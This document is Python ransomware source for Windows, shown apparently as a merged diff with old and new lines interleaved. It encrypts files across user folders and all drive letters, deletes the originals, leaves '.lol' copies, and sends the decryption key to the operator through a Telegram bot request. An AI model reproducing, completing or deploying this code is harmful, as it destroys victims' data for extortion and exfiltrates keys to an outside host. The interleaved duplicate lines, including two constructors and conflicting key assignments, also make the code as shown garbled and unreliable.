#!/usr/bin/python3

import threading, ctypes, pathlib
import cryptography, os, requests, sys
import threading, ctypes, pathlib, nacl, tkinter
import cryptography, os, requests, sys, nacl.secret
from PIL import Image, ImageDraw, ImageFont
from win32api import GetSystemMetrics
from cryptography.fernet import Fernet
from tkinter import messagebox
from time import sleep


class D_E_ncrypt(object):              # Encrypter Class (Our main Class )

    def __init__(self, Target=0, FernetM=0, Url=0):
    def __init__(self, Target=0, BoxM=0, Url=0):

        self.Target     = Target       # File Path
        self.FernetM    = FernetM      # Our Fernet Moudle
        self.BoxM       = BoxM         # Our Box Moudle
        self.Url        = Url          # Our Api Url in my case Telegram

    def FileE(loc):                    # We Pass File Name And Path In Hare In Order  To Encrypt Them
        print(f"FILE -> {loc.Target}")
        try:                           # Run Try/Except So We Dont Run in to Error
            if (os.path.isdir(loc.Target) != True) :    # Cheak If Its File not Directory                        

                with open(loc.Target, "rb") as File:    # Opeing  File 
                        Date    = File.read()           # Reading File & Saving it In tmp Var

                FileName    = loc.Target                # File name
                Encrypted   = loc.FernetM.encrypt(Date) # Encrypting tmp Var
                Encrypted   = loc.BoxM.encrypt(Date) # Encrypting tmp Var

                if(loc.Target != sys.argv[0]):          # If Target File is not Our own script Do this  
                    with open(f"{FileName}.lol","wb") as File: # Opeing  File To write File
                        print(f"FILE -> {FileName}")    # Printing File name for batter Debug
                        File.write(Encrypted)           # Writeing The File 
                    os.remove(loc.Target)               # Removing OG File
        except Exception as e:print(f"Error -> {e}")


    def SendKey(Key):               # We Pass Decrypt Key and Api url To Make Get request
        requests.get(Key.Url)       # We send request 

@@ -44,22 +42,20 @@ def SendKey(Key):               # We Pass Decrypt Key and Api url To Make Get re
MaxThread   = 120                                         # Setting up Our max Number of Thread
AdminRight  = ctypes.windll.shell32.IsUserAnAdmin()       # Cheaking for admin Perms

Key         = Fernet.generate_key()                       # Making A key IN order to D/Encypt with it
FKey        = Fernet(Key)                                 # Our Fernet Moudle
Key         = nacl.utils.random(nacl.secret.SecretBox.KEY_SIZE)                       # Making A key IN order to D/Encypt with it
Box         = nacl.secret.SecretBox(Key)                                              # Our Safe box Moudle that we use to Decrypte

Token       = "Your Telegram Token So you can Get Decrypt The Files!"   # Our Api Token
NumID       = "Your User ID so Bot just Send Key To You !"              # Our User ID

Message     = (f"{User} -> {Key}")                                      # Makeing Prefix for Massges

PathList    = [ f"c:\\Users",f"c:\\Users\\{User}\\Desktop",             # Our System Path list to Look For
                f"c:\\Users\\{User}\\Pictures",                         # Date To Encrypt .
                f"c:\\Users\\{User}\\Documents",
                f"c:\\Users\\{User}\\Music",
                f"c:\\Users\\{User}\\Downloads", os.getcwd()]
PathList    = [r"C:\Users\\"]                                           # You can add more Paths hare if you went 

for Latter in range(97,123): (PathList.append(f"{chr(Latter)}:\\"))     # Making list of A,Z in order to pass as Drive
PathList.pop(8)                 # Removing C Drive
for Latter in range(97,123): (PathList.append(f"{chr(Latter)}:\\"))     # Making list of A,Z in order to pass as Drive to our path list
PathList.remove("c:\\")                                                 # Removing C Drive

print(f"list -> {PathList}")    # Remove This line this is just for Debuging
print(f"We are -> {Script}")    # Remove This line this is just for Debuging
print(f"Key - >  {Key}")        # Remove This line this is just for Debuging

@@ -104,40 +100,38 @@ def CallErrorBox():         # Making Simple Error Box in Tk
                if (pathlib.Path(AllFiles).exists()):                       # Cheak if Path Exist

                    for path, subdirs, files in os.walk(AllFiles):          # For All Drives & Files
                        if("$Recycle.Bin" in path):                         # Skip Junks
                            pass
                        elif("c:\\Windows" in path):                        # Skip c:\\Windows
                            pass
                        elif("System32" in path):                           # Skip System32
                            pass

                        if("$Recycle.Bin" in path):pass                         # Skip Junks
                        elif("c:\\Windows" in path):pass                        # Skip c:\\Windows
                        elif("\\AppData\\" in path):pass                        # Skip \AppData\
                        elif("System32" in path):pass                           # Skip System32

                        else:                                               # After That 

                            for name in files:                              # For Files in Folder

                                FilePath    = os.path.join(path, name)      # Join File path to File Name
                                FileSize    = os.stat(FilePath).st_size     # Get The File Size

                                if(".dll" in name ):                        # Skip This File Format
                                    pass
                                elif(".exe" in name ):                      # Skip This File Format
                                    pass
                                elif(".msn" in name ):                      # Skip This File Format
                                    pass
                                if(".dll" in name ):pass                        # Skip This File Format
                                elif(".exe" in name ):pass                      # Skip This File Format
                                elif(".msn" in name ):pass                      # Skip This File Format

                                else :

                                    if (FileSize >= 50000000 ):             # If File size is More then 50mb make Thread for this file
                                        while True:                         # Make While Ture
                                            if len(threading.enumerate()) < MaxThread: # IF your Worker List is Free

                                                EncrypterObj = D_E_ncrypt(FilePath, FKey) # Pass in file name And key 
                                                EncrypterObj = D_E_ncrypt(FilePath, Box) # Pass in file name And key 
                                                threading.Thread(target=EncrypterObj.FileE, args=()).start() # to Encypte. 

                                                break                                                        # Break Out

                                            else: sleep(0.2)                                                 # Sleep for 0.2 Sec Until Spot Get Free
                                    else :
                                        print(FilePath)                        # Remove This line this is just for Debuging                        
                                        D_E_ncrypt(FilePath, FKey).FileE()     # Pass In File Name And key 
                                        D_E_ncrypt(FilePath, Box).FileE()      # Pass In File Name And key 
            except Exception as e:print(f"Error -> {e}")                       # remove Print And Replace Ut With Pass 
    else: 
        CallErrorBox()  # Call Error Box
